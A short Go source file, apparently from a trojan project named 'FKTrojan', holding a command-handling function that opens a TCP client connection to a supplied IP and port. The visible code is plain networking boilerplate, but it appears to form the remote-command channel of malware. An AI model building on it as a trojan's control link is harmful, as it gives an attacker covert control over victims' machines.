package service_command

import (
	"FKTrojan/connect"
	. "FKTrojan/flog"
)

func HandleCommand(ip string, port int, handler connect.Handler) {
	client := connect.NewTcpClient(ip, port, handler)
	err := client.Run()
	if err != nil {
		Flog.Printf("client error %v\n", err)
	}
	return
}
